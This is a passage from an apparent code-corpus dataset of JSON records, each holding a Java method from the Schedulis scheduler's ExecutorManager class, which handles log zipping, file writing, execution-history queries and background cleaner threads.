"ExecutorManager", "params": ["ExecutableFlow"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "String", "snippet": "  public String getDownLoadAllExecutionLog(ExecutableFlow executableFlow) throws ExecutorManagerException {\n\n    String logZipFilePath = \"\";\n\n    //\u5faa\u73af\u83b7\u53d6\u6570\u636e\u5e93\u5206\u6bb5\u65e5\u5fd7\u6570\u636e\n    try {\n      List<String> nameList = new ArrayList<>();\n      //\u83b7\u53d6\u6240\u6709\u6267\u884c\u8282\u70b9\n      getExecutableNodeInfo(executableFlow, nameList);\n      //\u83b7\u53d6\u65e5\u5fd7\u6587\u4ef6\u5939\n      File flowLogDir = new File(\"temp\" + File.separator + executableFlow.getId() + System.currentTimeMillis());\n      //\u5982\u679c\u76ee\u5f55\u5b58\u5728\n      if(flowLogDir.exists()){\n        //\u5148\u5220\u9664\u76ee\u5f55\n        flowLogDir.delete();\n        //\u518d\u521b\u5efa\u6587\u4ef6\u5939\n        flowLogDir.mkdir();\n      }else{\n        //\u4e0d\u5b58\u5728\u5c31\u76f4\u63a5\u521b\u5efa\u6587\u4ef6\u5939\n        flowLogDir.mkdir();\n      }\n\n      for(String jobName : nameList){\n        //\u83b7\u53d6\u65e5\u5fd7\u6587\u672c\n        LogData value = executorLoader.fetchAllLogs(executableFlow.getExecutionId(), jobName, 0);\n        if (null != value){\n          //\u521b\u5efa\u65e5\u5fd7\u6587\u4ef6\n          final File file = new File(flowLogDir + File.separator + jobName + \".log\");\n          //\u628a\u65e5\u5fd7\u6587\u672c\u5199\u5165\u5230\u65e5\u5fd7\u6587\u4ef6\u4e2d\n          FileWrite(file.getPath(), file.getName(), value.getData());\n        }\n      }\n\n      //\u628a\u65e5\u5fd7\u6587\u4ef6\u5939\u5230\u5305\u6210Zip\u5305\n      logZipFilePath =\n          fileToZip(flowLogDir.getPath(), new File(\"temp\").getPath(), flowLogDir.getName());\n\n    } catch (Exception e) {\n      logger.error(\"\u4e0b\u8f7d\u6240\u6709\u65e5\u5fd7\u6570\u636e\u5931\u8d25, \u539f\u56e0\u4e3a:\" + e);\n    }\n\n    return logZipFilePath;\n\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34466, "method_name": "fileToZip", "class_name": "ExecutorManager", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String fileToZip(String sourceFilePath, String zipFilePath, String fileName){\n    boolean flag = false;\n    File sourceFile = new File(sourceFilePath);\n    FileInputStream fis = null;\n    BufferedInputStream bis = null;\n    FileOutputStream fos = null;\n    ZipOutputStream zos = null;\n\n    File zipFile = new File(zipFilePath + \"/\" + fileName +\".zip\");\n    if(sourceFile.exists() == false){\n      System.out.println(\"\u5f85\u538b\u7f29\u7684\u6587\u4ef6\u76ee\u5f55\uff1a\"+sourceFilePath+\"\u4e0d\u5b58\u5728.\");\n    }else{\n      try {\n        //zipFile = File.createTempFile(fileName, \".zip\", new File(\"temp\"));\n        if(zipFile.exists()){\n          System.out.println(zipFilePath + \"\u76ee\u5f55\u4e0b\u5b58\u5728\u540d\u5b57\u4e3a:\" + fileName +\".zip\" +\"\u6253\u5305\u6587\u4ef6.\");\n        }else{\n          File[] sourceFiles = sourceFile.listFiles();\n          if(null == sourceFiles || sourceFiles.length<1){\n            System.out.println(\"\u5f85\u538b\u7f29\u7684\u6587\u4ef6\u76ee\u5f55\uff1a\" + sourceFilePath + \"\u91cc\u9762\u4e0d\u5b58\u5728\u6587\u4ef6\uff0c\u65e0\u9700\u538b\u7f29.\");\n          }else{\n            fos = new FileOutputStream(zipFile);\n            zos = new ZipOutputStream(new BufferedOutputStream(fos));\n            byte[] bufs = new byte[1024*10];\n            for(int i=0;i<sourceFiles.length;i++){\n              //\u521b\u5efaZIP\u5b9e\u4f53\uff0c\u5e76\u6dfb\u52a0\u8fdb\u538b\u7f29\u5305\n              ZipEntry zipEntry = new ZipEntry(sourceFiles[i].getName());\n              zos.putNextEntry(zipEntry);\n              //\u8bfb\u53d6\u5f85\u538b\u7f29\u7684\u6587\u4ef6\u5e76\u5199\u8fdb\u538b\u7f29\u5305\u91cc\n              fis = new FileInputStream(sourceFiles[i]);\n              bis = new BufferedInputStream(fis, 1024*10);\n              int read = 0;\n              while((read=bis.read(bufs, 0, 1024*10)) != -1){\n                zos.write(bufs,0,read);\n              }\n            }\n            flag = true;\n          }\n        }\n      } catch (FileNotFoundException e) {\n        logger.error(\"FileNotFoundException , caused by:\" + e);\n        throw new RuntimeException(e);\n      } catch (IOException e) {\n        logger.error(\"IOException , caused by:\" + e);\n        throw new RuntimeException(e);\n      } finally{\n        //\u5173\u95ed\u6d41\n        try {\n          if(null != bis) {\n            bis.close();\n          }\n          if(null != zos) {\n            zos.close();\n          }\n        } catch (IOException e) {\n          logger.error(\"close io stream failed, caused by:\" + e);\n        }\n      }\n    }\n    return zipFile.getPath();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34467, "method_name": "getExecutableNodeInfo", "class_name": "ExecutorManager", "params": ["ExecutableNode", "List<String>"], "throws": null, "modifiers": ["private"], "return_type": "Map<String,Object>", "snippet": "  private Map<String, Object> getExecutableNodeInfo(final ExecutableNode node, final List<String> nameList) {\n    final HashMap<String, Object> nodeObj = new HashMap<>();\n    nodeObj.put(\"id\", node.getId());\n\n    if(null != node.getParentFlow()){\n      nameList.add(node.getNestedId());\n    }\n\n    if (node instanceof ExecutableFlowBase) {\n      final ExecutableFlowBase base = (ExecutableFlowBase) node;\n      final ArrayList<Map<String, Object>> nodeList = new ArrayList<>();\n      for (final ExecutableNode subNode : base.getExecutableNodes()) {\n        final Map<String, Object> subNodeObj = getExecutableNodeInfo(subNode, nameList);\n        if (!subNodeObj.isEmpty()) {\n          nodeList.add(subNodeObj);\n        }\n      }\n      nodeObj.put(\"flow\", base.getFlowId());\n      nodeObj.put(\"nodes\", nodeList);\n      nodeObj.put(\"flowId\", base.getFlowId());\n    }\n\n    return nodeObj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34468, "method_name": "FileWrite", "class_name": "ExecutorManager", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void FileWrite(String allFilePath, String fileName, String fileStr) {\n\n    FileWriter fw = null;\n    try {\n      fw = new FileWriter(allFilePath);\n      //\u5199\u5165\u5230\u6587\u4ef6\n      fw.write(fileStr);\n    } catch (IOException e) {\n      e.printStackTrace();\n    } finally {\n      if (fw != null) {\n        try {\n          fw.close();\n        } catch (IOException e) {\n          logger.error(\"close io stream failed, caused by:\" + e);\n        }\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34469, "method_name": "getJobLogByJobId", "class_name": "ExecutorManager", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "String", "snippet": "  public String getJobLogByJobId(int execId, String jobName) throws ExecutorManagerException{\n    String logZipFilePath = \"\";\n\n    try {\n      //\u83b7\u53d6\u65e5\u5fd7\u6587\u4ef6\u5939\n      File flowLogDir = new File(\"temp\" + File.separator + jobName + System.currentTimeMillis());\n      //\u5982\u679c\u76ee\u5f55\u5b58\u5728\n      if(flowLogDir.exists()){\n        //\u5148\u5220\u9664\u76ee\u5f55\n        flowLogDir.delete();\n        //\u518d\u521b\u5efa\u6587\u4ef6\u5939\n        flowLogDir.mkdir();\n      }else{\n        //\u4e0d\u5b58\u5728\u5c31\u76f4\u63a5\u521b\u5efa\u6587\u4ef6\u5939\n        flowLogDir.mkdir();\n      }\n      //\u83b7\u53d6Job\u65e5\u5fd7\u6587\u672c\n      LogData value = executorLoader.fetchAllLogs(execId, jobName, 0);\n      if (null != value){\n        //\u521b\u5efa\u65e5\u5fd7\u6587\u4ef6\n        final File file = new File(flowLogDir + File.separator + jobName + \".txt\");\n        //\u628a\u65e5\u5fd7\u6587\u672c\u5199\u5165\u5230\u65e5\u5fd7\u6587\u4ef6\u4e2d\n        FileWrite(file.getPath(), file.getName(), value.getData());\n\n        logZipFilePath = file.getPath();\n      }\n\n      //\u628a\u65e5\u5fd7\u6587\u4ef6\u5939\u5230\u5305\u6210Zip\u5305\n//      logZipFilePath =\n//          fileToZip(flowLogDir.getPath(), new File(\"temp\").getPath(), flowLogDir.getName());\n\n    } catch (Exception e) {\n      logger.error(\"getJobLogByJobId execute failed, caused by:\" + e);\n    }\n\n    return logZipFilePath;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34470, "method_name": "getAllExecutionJobLog", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "String", "snippet": "  public String getAllExecutionJobLog(ExecutableFlow exFlow, String jobId, int attempt) throws ExecutorManagerException {\n    Pair<ExecutionReference, ExecutableFlow> pair =\n        runningFlows.get(exFlow.getExecutionId());\n\n    StringBuilder allLogData = new StringBuilder();\n\n    int offset = 0;\n    int length = 50000;\n    //\n    while (true){\n      LogData value =\n          executorLoader.fetchLogs(exFlow.getExecutionId(), jobId, attempt, offset, length);\n      if(null == value){\n        break;\n      }\n      //\n      allLogData.append(value.getData());\n      offset += length;\n    }\n    return allLogData.toString();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34471, "method_name": "listAllLogFilter", "class_name": "ExecutorManager", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<LogFilterEntity>", "snippet": "  public List<LogFilterEntity> listAllLogFilter() throws ExecutorManagerException {\n\n    return executorLoader.listAllLogFilter();\n\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34472, "method_name": "getExecHistoryTotal", "class_name": "ExecutorManager", "params": ["Map<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecHistoryTotal(final Map<String, String> filterMap) throws ExecutorManagerException{\n\n    return executorLoader.getExecHistoryTotal(filterMap);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34473, "method_name": "getExecHistoryTotal", "class_name": "ExecutorManager", "params": ["String", "Map<String,String>", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecHistoryTotal(String username, final Map<String, String> filterMap, List<Integer> projectIds)\n          throws ExecutorManagerException {\n    return executorLoader.getExecHistoryTotal(username, filterMap, projectIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34474, "method_name": "getMaintainedExecHistoryTotal", "class_name": "ExecutorManager", "params": ["String", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getMaintainedExecHistoryTotal(String username, List<Integer> projectIds)\n          throws ExecutorManagerException {\n    return executorLoader.getMaintainedExecHistoryTotal(username, projectIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34475, "method_name": "getExecHistoryQuickSerachTotal", "class_name": "ExecutorManager", "params": ["Map<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecHistoryQuickSerachTotal(final Map<String, String> filterMap) throws ExecutorManagerException{\n\n    return executorLoader.getExecHistoryQuickSerachTotal(filterMap);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34476, "method_name": "getMaintainedFlowsQuickSearchTotal", "class_name": "ExecutorManager", "params": ["String", "Map<String,String>", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getMaintainedFlowsQuickSearchTotal(String username, final Map<String, String> filterMap, List<Integer> projectIds)\n            throws ExecutorManagerException {\n      return executorLoader.getMaintainedFlowsQuickSearchTotal(username, filterMap, projectIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34477, "method_name": "getUserExecutableFlowsTotalByProjectIdAndFlowId", "class_name": "ExecutorManager", "params": ["int", "String", "int", "int", "List<ExecutableFlow>", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getUserExecutableFlowsTotalByProjectIdAndFlowId(final int projectId, final String flowId, final int from,\n      final int length, final List<ExecutableFlow> outputList, final String userName)\n      throws ExecutorManagerException {\n    final List<ExecutableFlow> flows =\n        this.executorLoader.fetchUserFlowHistoryByProjectIdAndFlowId(projectId, flowId, from, length, userName);\n    outputList.addAll(flows);\n    return this.executorLoader.fetchNumUserExecutableFlowsByProjectIdAndFlowId(projectId, flowId, userName);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34478, "method_name": "getExecutableFlowsMoyenneRunTime", "class_name": "ExecutorManager", "params": ["int", "String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "long", "snippet": "  public long getExecutableFlowsMoyenneRunTime(int projectId, String flowId, String user)\n      throws ExecutorManagerException{\n\n    final List<ExecutableFlow> exFlows =\n        this.executorLoader.fetchFlowAllHistory(projectId, flowId, user);\n\n    long moyenne = 0;\n    long allRunTime = 0;\n    int successFlowNum = 0;\n    for (final ExecutableFlow flow : exFlows) {\n      if(Status.SUCCEEDED.equals(flow.getStatus())){\n        successFlowNum += 1;\n        allRunTime += (flow.getEndTime() - flow.getStartTime());\n      }\n    }\n    if(allRunTime !=0 && successFlowNum !=0){\n      moyenne = allRunTime/successFlowNum;\n    }\n\n    return moyenne;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34479, "method_name": "getUserExecHistoryTotal", "class_name": "ExecutorManager", "params": ["Map<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getUserExecHistoryTotal(final Map<String, String> filterMap) throws ExecutorManagerException{\n\n    return executorLoader.getUserExecHistoryTotal(filterMap);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34480, "method_name": "getUserExecHistoryQuickSerachTotal", "class_name": "ExecutorManager", "params": ["Map<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getUserExecHistoryQuickSerachTotal(final Map<String, String> filterMap) throws ExecutorManagerException{\n\n    return executorLoader.getUserExecHistoryQuickSerachTotal(filterMap);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34481, "method_name": "getUserExecutableFlows", "class_name": "ExecutorManager", "params": ["String", "String", "String", "String", "String", "String", "long", "long", "int", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getUserExecutableFlows(String loginUser, String projContain,\n      String flowContain, String execIdContain, String userContain, String status, long begin, long end,\n      int skip, int size, int flowType) throws ExecutorManagerException {\n    List<ExecutableFlow> flows =\n        executorLoader.fetchUserFlowHistory(loginUser, projContain, flowContain, execIdContain, userContain,\n            status, begin, end, skip, size, flowType);\n\n    return flows;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34482, "method_name": "getTodayExecutableFlowData", "class_name": "ExecutorManager", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getTodayExecutableFlowData(final String userName) throws ExecutorManagerException{\n    List<ExecutableFlow> flows =\n        executorLoader.getTodayExecutableFlowData(userName);\n\n    return flows;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34483, "method_name": "getTodayExecutableFlowDataNew", "class_name": "ExecutorManager", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getTodayExecutableFlowDataNew(final String userName) throws ExecutorManagerException {\n\n    return executorLoader.getTodayExecutableFlowDataNew(userName);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34484, "method_name": "getTodayFlowRunTimesByFlowId", "class_name": "ExecutorManager", "params": ["String", "String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getTodayFlowRunTimesByFlowId(final String projectId, String flowId, final String usename) throws ExecutorManagerException {\n    return executorLoader.getTodayFlowRunTimesByFlowId(projectId, flowId, usename);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34485, "method_name": "getRealTimeExecFlowData", "class_name": "ExecutorManager", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getRealTimeExecFlowData(final String userName) throws ExecutorManagerException{\n    List<ExecutableFlow> flows =\n        executorLoader.getRealTimeExecFlowData(userName);\n\n    return flows;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34486, "method_name": "getRecentExecutableFlow", "class_name": "ExecutorManager", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "ExecutableFlow", "snippet": "  public ExecutableFlow getRecentExecutableFlow(int projectId, String flowId) throws ExecutorManagerException{\n    ExecutableFlow flow = executorLoader.getProjectLastExecutableFlow(projectId, flowId);\n    return flow;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34487, "method_name": "getExectingFlowsData", "class_name": "ExecutorManager", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "List<Map>", "snippet": "  public List<Map<String, String>> getExectingFlowsData() throws IOException {\n\n    List<ExecutableFlow> flows = new ArrayList<>();\n    try {\n      flows = this.executorLoader.fetchAllUnfinishedFlows();\n    } catch (final ExecutorManagerException e) {\n      logger.error(\"Failed to get active flows with executor.\", e);\n    }\n    final List<Map<String, String>> exectingFlowList = new ArrayList<>();\n\n    WebUtils webUtils = new WebUtils();\n    if(null != flows && !flows.isEmpty()){\n      for(ExecutableFlow executableFlow : flows){\n        Map<String, String> repeatMap = executableFlow.getRepeatOption();\n        if(!repeatMap.isEmpty()){\n          Long recoverRunDate = Long.valueOf(String.valueOf(repeatMap.get(\"startTimeLong\")));\n          LocalDateTime localDateTime = new LocalDateTime(new Date(recoverRunDate)).minusDays(1);\n          Date date = localDateTime.toDate();\n          executableFlow.setUpdateTime(date.getTime());\n        }else{\n          String runDatestr = executableFlow.getExecutionOptions().getFlowParameters().get(\"run_date\");\n          Object runDateOther = executableFlow.getOtherOption().get(\"run_date\");\n          if(runDatestr!=null&&!\"\".equals(runDatestr)&&!runDatestr.isEmpty()){\n            try {\n              executableFlow.setUpdateTime(Long.parseLong(runDatestr));\n            } catch (Exception e) {\n              logger.error(\"rundate convert failed (String to long)\" + runDatestr + \"{}\"+e);\n            }finally {\n              executableFlow.setUpdateTime(0);\n              executableFlow.getOtherOption().put(\"run_date\",runDatestr);\n            }\n          }else if(runDateOther!=null&&!\"\".equals(runDateOther.toString())&&!runDateOther.toString().isEmpty()){\n            String runDateTime = (String) runDateOther;\n            runDateTime = runDateTime.replaceAll(\"\\'\",\"\").replaceAll(\"\\\"\",\"\");\n            if(SystemBuiltInParamJodeTimeUtils.dateFormatCheck(runDateTime)){\n              executableFlow.setUpdateTime(0);\n              runDateTime = runDateTime.replaceAll(\"[./-]\", \"\");\n              executableFlow.getOtherOption().put(\"run_date\", runDateTime);\n            } else {\n              if(-1 != executableFlow.getStartTime()) {\n                LocalDateTime localDateTime = new LocalDateTime(new Date(executableFlow.getStartTime())).minusDays(1);\n                Date date = localDateTime.toDate();\n                executableFlow.setUpdateTime(date.getTime());\n              }\n            }\n          }else{\n            Long runDate = executableFlow.getStartTime();\n            if(-1 != executableFlow.getStartTime()) {\n              LocalDateTime localDateTime = new LocalDateTime(new Date(executableFlow.getStartTime())).minusDays(1);\n              Date date = localDateTime.toDate();\n              executableFlow.setUpdateTime(date.getTime());\n            }\n          }\n        }\n        Map<String, String> exectingMap = new HashMap<>();\n\n        try {\n//          long moyenne = this.getExecutableFlowsMoyenneRunTime(\n//              executableFlow.getProjectId(), executableFlow.getFlowId(), null);\n\n          exectingMap.put(\"execId\", executableFlow.getExecutionId() + \"\");\n          String executorId = (String) executableFlow.getOtherOption().get(\"currentExecutorId\") != null ? (String)executableFlow.getOtherOption().get(\"currentExecutorId\") : \"\";\n          exectingMap.put(\"exectorId\", executorId);\n          exectingMap.put(\"flowName\", executableFlow.getFlowId());\n          exectingMap.put(\"projectName\", executableFlow.getProjectName());\n          exectingMap.put(\"submitUser\", executableFlow.getSubmitUser());\n          exectingMap.put(\"proxyUsers\", executableFlow.getProxyUsers().toString());\n          exectingMap.put(\"startTime\", webUtils.formatHistoryDateTime(executableFlow.getStartTime()));\n          //exectingMap.put(\"endTime\", executableFlow.getEndTime());\n          if(executableFlow.getOtherOption().get(\"run_date\")!=null){\n            exectingMap.put(\"runDate\", executableFlow.getUpdateTime()==0?executableFlow.getOtherOption().get(\"run_date\").toString():webUtils.formatRunDate(executableFlow.getUpdateTime()));\n          }else{\n            exectingMap.put(\"runDate\", webUtils.formatRunDate(executableFlow.getUpdateTime()));\n          }\n          exectingMap.put(\"duration\", Utils\n              .formatDuration(executableFlow.getStartTime(), executableFlow.getEndTime()));\n//          exectingMap.put(\"execTime\", webUtils.formatDurationTime(executableFlow.getStartTime(), executableFlow.getEndTime()) + \"\");\n//          exectingMap.put(\"moyenne\", moyenne + \"\");\n          exectingMap.put(\"status\", executableFlow.getStatus().toString());\n          exectingMap.put(\"flowType\", String.valueOf(executableFlow.getFlowType()));\n          exectingMap.put(\"projectId\", String.valueOf(executableFlow.getProjectId()));\n          exectingFlowList.add(exectingMap);\n        } catch (Exception e) {\n          throw new RuntimeException(\"generate executingMap failed\"+e);\n        }\n      }\n    }\n\n    return exectingFlowList;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34488, "method_name": "shutdown", "class_name": "CleanerThread", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void shutdown() {\n      this.shutdown = true;\n      this.interrupt();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34489, "method_name": "run", "class_name": "CleanerThread", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {\n      while (!this.shutdown) {\n        synchronized (this) {\n          try {\n            // Cleanup old stuff.\n            final long currentTime = System.currentTimeMillis();\n            if (currentTime - CLEANER_THREAD_WAIT_INTERVAL_MS > this.lastLogCleanTime) {\n              cleanExecutionLogs();\n              this.lastLogCleanTime = currentTime;\n            }\n\n            wait(CLEANER_THREAD_WAIT_INTERVAL_MS);\n          } catch (final InterruptedException e) {\n            ExecutorManager.logger.info(\"Interrupted. Probably to shut down.\");\n          }\n        }\n      }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34490, "method_name": "cleanExecutionLogs", "class_name": "CleanerThread", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void cleanExecutionLogs() {\n      ExecutorManager.logger.info(\"Cleaning old logs from execution_logs\");\n      final long cutoff = System.currentTimeMillis() - this.executionLogsRetentionMs;\n      ExecutorManager.logger.info(\"Cleaning old log files before \"\n          + new DateTime(cutoff).toString());\n      cleanOldExecutionLogs(System.currentTimeMillis()\n          - this.executionLogsRetentionMs);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34491, "method_name": "isActive", "class_name": "QueueProcessorThread", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isActive() {\n      return this.isActive;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34492, "method_name": "setActive", "class_name": "QueueProcessorThread", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setActive(final boolean isActive) {\n      this.isActive = isActive;\n      ExecutorManager.logger.info(\"QueueProcessorThread active turned \" + this.isActive);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34493, "method_name": "shutdown", "class_name": "QueueProcessorThread", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void shutdown() {\n      this.shutdown = true;\n      this.interrupt();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34494, "method_name": "run", "class_name": "QueueProcessorThread", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {\n      // Loops till QueueProcessorThread is shutdown\n      while 